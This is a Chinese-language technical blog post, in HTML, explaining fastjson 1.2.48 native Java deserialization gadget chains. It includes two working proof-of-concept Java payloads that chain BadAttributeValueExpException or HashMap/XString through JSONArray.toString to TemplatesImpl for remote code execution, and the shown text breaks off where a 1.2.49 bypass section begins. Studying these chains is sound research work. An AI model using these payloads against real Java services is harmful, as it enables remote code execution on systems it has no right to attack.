@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言这里学的是fastjson的原生反序列化即，依赖java自带的序列化机制，触发的反序列化漏洞这里是因为fastjson已经自定义了一套序列化机制，因此与这个区分开在某些高限制场景可以试着打一打这条链子我们看一下，fastjson的原生反序列化漏洞   fastjson-1.2.48使用的jdk是8u85依赖 12345&lt;dependency&gt;    &lt;groupId&gt;c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson原生反序列化">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言这里学的是fastjson的原生反序列化即，依赖java自带的序列化机制，触发的反序列化漏洞这里是因为fastjson已经自定义了一套序列化机制，因此与这个区分开在某些高限制场景可以试着打一打这条链子我们看一下，fastjson的原生反序列化漏洞   fastjson-1.2.48使用的jdk是8u85依赖 12345&lt;dependency&gt;    &lt;groupId&gt;c">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181100869.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181116675.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181126722.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181023079.png">
+<meta property="article:published_time" content="2025-09-16T23:50:52.000Z">
+<meta property="article:modified_time" content="2025-09-18T07:37:40.965Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181100869.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson原生反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/n1CTF-web-WP/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC7%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=fastjson原生反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=fastjson原生反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson原生反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=fastjson原生反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=fastjson原生反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-48"><span class="toc-number">2.</span> <span class="toc-text">fastjson-1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8D%8A%E6%AE%B5%E9%93%BE%E5%AD%90"><span class="toc-number">2.1.</span> <span class="toc-text">后半段链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8D%8A%E6%AE%B5%E9%93%BE%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">前半段链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc1"><span class="toc-number">2.3.</span> <span class="toc-text">poc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc2"><span class="toc-number">2.4.</span> <span class="toc-text">poc2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-49"><span class="toc-number">3.</span> <span class="toc-text">fastjson-1.2.49</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        fastjson原生反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-16T23:50:52.000Z" class="dt-published" itemprop="datePublished">2025-09-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a> › <a class="category-link" href="/categories/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里学的是fastjson的原生反序列化<br>即，依赖java自带的序列化机制，触发的反序列化漏洞<br>这里是因为fastjson已经自定义了一套序列化机制，因此与这个区分开<br>在某些高限制场景可以试着打一打这条链子<br>我们看一下，fastjson的原生反序列化漏洞  </p>
+<h2 id="fastjson-1-2-48"><a href="#fastjson-1-2-48" class="headerlink" title="fastjson-1.2.48"></a>fastjson-1.2.48</h2><p>使用的jdk是8u85<br>依赖</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里有定义</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serilize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ObjectOutputStream  oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;1.bin&quot;</span>)));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream ois= <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">    fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    fieldName.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="后半段链子"><a href="#后半段链子" class="headerlink" title="后半段链子"></a>后半段链子</h3><p>我们看一下fastjson里面哪些类继承Serializable接口<br>Ctrl+N搜索Serializable类<br>进入选中Ctrl+Alt+B,查看调用<br>找到fastjson包里的使用情况找到两个json类<br>JSONObject<br>JSONArray<br>这两个类都继承了JSON，拥有了这两个方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toJSONString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SerializeWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializeWriter</span>();</span><br><span class="line"></span><br><span class="line">    String var2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">JSONSerializer</span>(out)).write(<span class="built_in">this</span>);</span><br><span class="line">        var2 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>假设我们找到了一个入口类调用了toString呢？<br>(因为这个版本的JSON类没有实现readobject)<br>进入write方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">ObjectSerializer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="built_in">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="built_in">this</span>, object, (Object)<span class="literal">null</span>, (Type)<span class="literal">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>跟进getObjectWriter方法，j进入SerializeConfig类<br>getObjectWriter这个方法内容较大，简述就是<br>先判断serializers这个HashMap当中有无默认映射，然后会默认通过createJavaBeanSerializer方法创建一个ObjectSerializer对象  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个方法也最终会将二次处理的beaninfo继续委托给createASMSerializer做处理，而这个方法其实就是通过ASM动态创建一个类</span><br><span class="line">getter方法的生成在com.alibaba.fastjson.serializer.ASMSerializerFactory#generateWriteMethod当中</span><br><span class="line">它会根据字段的类型调用不同的方法处理</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></div>
+<p>详细可见<br><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%BA%E4%BB%80%E4%B9%88fastjson1%E7%9A%841-2-49%E4%BB%A5%E5%90%8E%E4%B8%8D%E5%86%8D%E8%83%BD%E5%88%A9%E7%94%A8">fastjson-反序列化</a><br>我们之前打过jdk7u21的原生链，里面就是这样的方式调用了TemplatesImpl类里的getOutputProperties方法，而这个方法会调用newTransformer方法,最终调用恶意类的构造方法，实现rce<br>那么现在的问题，变成了，从哪里调用JSON类的toString方法呢?</p>
+<h3 id="前半段链子"><a href="#前半段链子" class="headerlink" title="前半段链子"></a>前半段链子</h3><p>需要找到一个类可以调用指定类的toString方法<br>了解到BadAttributeValueExpException类，这条触发toString的链子会在CC5中进行讲解<br>到此，成了  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>只要通过反射调用修改val值，我们就可以调用对象的toString方法了</p>
+<h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                ClassPool.getDefault().get(com.example.Evil.class.getName());</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Sh_eePppp&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">valfield.set(val, jsonArray);</span><br><span class="line">serilize(val);</span><br><span class="line">unserilize(<span class="string">&quot;1.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><p>触发toString方法还存在着第二条链，我们从HashMap入口进入<br><code>HashMap#readObject -&gt; XString#equals -&gt; JSONObject#toString</code>  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                ClassPool.getDefault().get(com.example.Evil.class.getName());</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Sh_eePppp&quot;</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);</span><br><span class="line"><span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map1.put(<span class="string">&quot;aa&quot;</span>, jsonArray);</span><br><span class="line">map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">map2.put(<span class="string">&quot;bB&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">hashMap.put(map2, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">serilize(hashMap);</span><br><span class="line">unserilize(<span class="string">&quot;1.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+<h2 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson-1.2.49"></a>fastjson-1.2.49</h2><p>从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法<br>而这个readObject方法里，在SecureObjectInputStream类当中重写了resolveClass方法，其中调用了checkAutoType方法做类的检查<br>基于此类情况，TemplatesImpl类不被允许加载，poc1与poc2全部失效<br>我们需要找到一个绕过chexkAutoType检测的方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">secIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureObjectInputStream</span>(in);</span><br></pre></td></tr></table></figure></div>
